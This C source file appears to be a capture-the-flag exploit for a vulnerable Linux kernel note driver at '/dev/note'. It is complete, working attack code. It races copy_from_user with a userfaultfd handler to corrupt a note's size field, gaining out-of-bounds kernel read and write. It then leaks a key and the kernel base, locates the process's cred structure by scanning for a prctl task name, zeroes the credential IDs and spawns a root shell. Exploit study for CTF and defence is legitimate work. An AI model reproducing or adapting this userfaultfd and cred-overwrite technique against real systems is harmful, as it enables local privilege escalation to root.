#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>

typedef struct _data
{
	size_t idx;
	size_t size;
	char* ptr;
}data;

int fd;
void init()
{
	fd = open("/dev/note", 0);
	if (fd < 0)
		exit(-1);
	puts("[*] init done!");
}

void errExit(char* msg)
{
	puts(msg);
	exit(-1);
}

void create(char* buf, uint8_t size)
{
	data arg;
	arg.size = size;
	arg.ptr = buf;
	if (ioctl(fd, -256, &arg) < 0)
		errExit("[!] failed to create");
}

void edit(uint8_t idx, char* buf, uint8_t size)
{
	data arg;
	arg.size = size;
	arg.ptr = buf;
	arg.idx = idx;
	if (ioctl(fd, -255, &arg) < 0)
		errExit("[!] failed to edit");
}

void show(uint8_t idx, char* buf)
{
	data arg;
	arg.ptr = buf;
	arg.idx = idx;
	if (ioctl(fd, -254, &arg) < 0)
		errExit("[!] failed to show");
}

void reset()
{
	data arg;
	if (ioctl(fd, -253, &arg) < 0)
		errExit("[!] failed to reset");
}

char buffer[0x1000];
#define FAULT_PAGE ((void*)(0x1337000))
void* handler(void *arg)
{
	struct uffd_msg msg;
	uintptr_t uffd = (uintptr_t)arg;
	puts("[*] handler created");

	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd,1,-1);
	if (nready != 1)
		errExit("wrong poll return value");
	// this will wait until copy_from_user is called on FAULT_PAGE
	printf("trigger! I'm going to hang\n");
	// now main thread stops at copy_from_user function
	// but now we can do some evil operations!

	reset();
	create(buffer, 0);
	create(buffer, 0);
	// original memory: note struct + 0x10 buffer
	// current memory: note0 struct + note1 struct
	// therefore, size field of note1 can be tampered

	if (read(uffd, &msg, sizeof(msg)) != sizeof(msg))
		errExit("error in reading uffd_msg");
	// read a msg struct from uffd, although not used

	struct uffdio_copy uc;
	memset(buffer, 0, sizeof(buffer));
	buffer[8] = 0xf0; // notes[1].size = 0xf0
	// because LSB of xor key is always 0
	// so we can rewrite the size of note1 like this
	uc.src = (uintptr_t)buffer;
	uc.dst = (uintptr_t)FAULT_PAGE;
	uc.len = 0x1000;
	uc.mode = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	// resume copy_from_user with buffer as data

	puts("[*] done 1");
	// now note1 has length 0xf0

	return NULL;
}

void register_userfault()
{
	struct uffdio_api ua;
	struct uffdio_register ur;
	pthread_t thr;

	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;
	if (ioctl(uffd, UFFDIO_API, &ua) == -1)
		errExit("ioctl-UFFDIO_API");
	// create the user fault fd

	if (mmap(FAULT_PAGE,0x1000,7,0x22,-1,0) != FAULT_PAGE)
		errExit("mmap fault page");
	// create page used for user fault

	ur.range.start = (unsigned long)FAULT_PAGE;
	ur.range.len = 0x1000;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("ioctl-UFFDIO_REGISTER");
	// register the page into user fault fd
	// so that if copy_from_user accesses FAULT_PAGE,
	// the access will be hanged, and uffd will receive something

	int s = pthread_create(&thr,NULL,handler,(void*)uffd);
	if(s!=0)
		errExit("pthread_create");
	// create handler that process the user fault
}

int main(int argc, char const *argv[])
{
	init();
	create(buffer, 0x10);
	// create a note, with size 0x10
	// so memory layout: note struct + 0x10 buffer
	register_userfault();
	// register the user fault
	edit(0, FAULT_PAGE, 1);
	/*
	The vulnerability is at edit operation
	copy_from_user function can actually be manipulated
	we can stop at this operation and change heap layout
	so that subsequent copy can tamper critical structure
	the idea is to modify the size of next note
	and produce an OOB R&W
	*/

	show(1, buffer);
	uintptr_t key = *(uintptr_t*)buffer;
	// leak the key by reading 0

	create(buffer, 0);
	// create note2,
	// whose fields can be read&written using note1
	show(1, buffer);
	intptr_t data_off = *(uintptr_t*)(buffer + 0x10) ^ key;
	// leak the offset to bss

	printf("key=0x%lx\ndata_off=0x%lx\n", key, data_off);

	intptr_t base_off = data_off - 0x2568;
	intptr_t page_base_off = base_off + 0x1fa;

	uintptr_t* fake_note = (uintptr_t*)buffer;
	fake_note[0] = 0 ^ key;
	fake_note[1] = 4 ^ key;
	fake_note[2] = page_base_off ^ key;
	edit(1, buffer, 0x18);
	int32_t rip_to_page_base;
	show(2, (char*)&rip_to_page_base);
	printf("rip_to_page_base=0x%x\n", rip_to_page_base);
	// 0x1fa is an instruction
	// its immediate constant contains offset to base

	page_base_off = base_off + 0x1fe + rip_to_page_base;
	printf("page_base_off=0x%lx\n", page_base_off);
	fake_note[1] = 8 ^ key;
	fake_note[2] = page_base_off ^ key;
	edit(1, buffer, 0x18);
	uintptr_t base_addr;
	show(2, (char*)&base_addr);
	printf("base_addr=0x%lx\n", base_addr);
	// calculate offset to address that stores base address
	// and leak the base address


	if (prctl(PR_SET_NAME, "ChineseAuxyTQL") < 0)
		errExit("prctl set name failed");
	uintptr_t* task;
	for (size_t off = 0;; off += 0x100)
	{
		fake_note[0] = 0 ^ key;
		fake_note[1] = 0xff ^ key;
		fake_note[2] = off ^ key;
		edit(1, buffer, 0x18);
		memset(buffer, 0, 0x100);
		show(2, buffer);
		task = (uintptr_t*)memmem(
			buffer, 0x100, "ChineseAuxyTQL", 14);
		if (task != NULL)
		{
			printf("[*] found: %p 0x%lx 0x%lx\n", task, task[-1], task[-2]);
			if (task[-1] > 0xffff000000000000 && task[-2] > 0xffff000000000000)
				break;
		}
	}
	// find the cred address using prctl trick

	fake_note[0] = 0 ^ key;
	fake_note[1] = 0x20 ^ key;
	fake_note[2] = (task[-2] + 4 - base_addr) ^ key;
	edit(1, buffer, 0x18);
	// calculate offset to cred, set it to note2

	int fake_cred[8];
	memset(fake_cred, 0, sizeof(fake_cred));
	edit(2, (char*)fake_cred, 0x20);
	// write ids to 0, get root shell

	char* args[2] = {"/bin/sh", NULL};
	execv("/bin/sh", args);

	return 0;
}
